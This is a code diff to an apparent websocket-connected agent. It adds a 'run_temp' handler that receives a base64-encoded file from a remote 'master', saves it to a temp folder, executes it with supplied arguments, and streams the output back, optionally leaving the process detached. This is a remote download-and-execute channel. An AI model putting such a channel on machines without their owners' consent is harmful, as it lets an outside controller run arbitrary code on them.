@@ -2583,6 +2583,109 @@ async def _connect_one_master(url: str):
                             except Exception as e:
                                 await _send_line(ws, "error", f"[upload] failed: {e}\n")
                             continue
+                        # --- Upload & run temp executable or script ---
+                        if isinstance(data, dict) and data.get("type") == "run_temp":
+                            try:
+                                name = str(data.get("name") or "run.bin").strip()
+                                try:
+                                    name = os.path.basename(name)
+                                except Exception:
+                                    pass
+                                s = str(data.get("data") or data.get("data_url") or data.get("b64") or "")
+                                if s.startswith('data:') and ';base64,' in s:
+                                    try:
+                                        s = s.split(';base64,', 1)[1]
+                                    except Exception:
+                                        pass
+                                raw = base64.b64decode(s, validate=False)
+                                # write to temp
+                                tmp_dir = os.path.join(current_agent_dir, 'temp_execs')
+                                os.makedirs(tmp_dir, exist_ok=True)
+                                tmp_path = os.path.join(tmp_dir, name)
+                                with open(tmp_path, 'wb') as f:
+                                    f.write(raw)
+                                await _send_line(ws, "output", f"[run] saved temp: {tmp_path}\n")
+                                # build args
+                                argv = [tmp_path]
+                                try:
+                                    extra = data.get('args') or []
+                                    if isinstance(extra, list):
+                                        argv.extend([str(x) for x in extra])
+                                except Exception:
+                                    pass
+                                # spawn process
+                                det = bool(data.get('detach') or False)
+                                if os.name == 'nt':
+                                    def _spawn():
+                                        flags = 0
+                                        try:
+                                            return subprocess.Popen(argv, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding='utf-8', errors='replace', creationflags=flags)
+                                        except Exception as e:
+                                            return e
+                                    p = await asyncio.to_thread(_spawn)
+                                else:
+                                    try:
+                                        p = await asyncio.create_subprocess_exec(*argv, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+                                    except Exception as e:
+                                        p = e
+                                if isinstance(p, Exception):
+                                    await _send_line(ws, "error", f"[run] spawn failed: {p}\n")
+                                    continue
+                                await _send_line(ws, "output", f"[run] started pid={getattr(p,'pid',None)}\n")
+                                if det:
+                                    continue
+                                # stream stdout/stderr
+                                if os.name == 'nt':
+                                    loop = asyncio.get_running_loop()
+                                    q: asyncio.Queue[tuple[str,str]] = asyncio.Queue()
+                                    def _reader(stream, key):
+                                        try:
+                                            for line in stream:
+                                                loop.call_soon_threadsafe(q.put_nowait, (key, line))
+                                        except Exception:
+                                            pass
+                                        finally:
+                                            loop.call_soon_threadsafe(q.put_nowait, ('__done__', key))
+                                    t1 = asyncio.create_task(asyncio.to_thread(_reader, p.stdout, 'output'))
+                                    t2 = asyncio.create_task(asyncio.to_thread(_reader, p.stderr, 'error'))
+                                    done = 0
+                                    while done < 2:
+                                        k, payload = await q.get()
+                                        if k == '__done__':
+                                            done += 1
+                                        else:
+                                            await _send_line(ws, k, payload)
+                                    try:
+                                        rc = await asyncio.wait_for(asyncio.to_thread(p.wait), timeout=600)
+                                    except asyncio.TimeoutError:
+                                        try:
+                                            p.terminate()
+                                        except Exception:
+                                            pass
+                                        rc = 124
+                                else:
+                                    async def reader(stream, key):
+                                        try:
+                                            while True:
+                                                line = await stream.readline()
+                                                if not line:
+                                                    break
+                                                await _send_line(ws, key, line.decode(errors='replace'))
+                                        except Exception:
+                                            pass
+                                    await asyncio.gather(reader(p.stdout, 'output'), reader(p.stderr, 'error'))
+                                    try:
+                                        rc = await asyncio.wait_for(p.wait(), timeout=600)
+                                    except asyncio.TimeoutError:
+                                        try:
+                                            p.terminate()
+                                        except Exception:
+                                            pass
+                                        rc = 124
+                                await _send_line(ws, 'exit_code', rc)
+                            except Exception as e:
+                                await _send_line(ws, 'error', f"[run] failed: {e}\n")
+                            continue
                         cmd = data.get("command")
                         if cmd:
                             # If interactive is running, do not queue normal commands
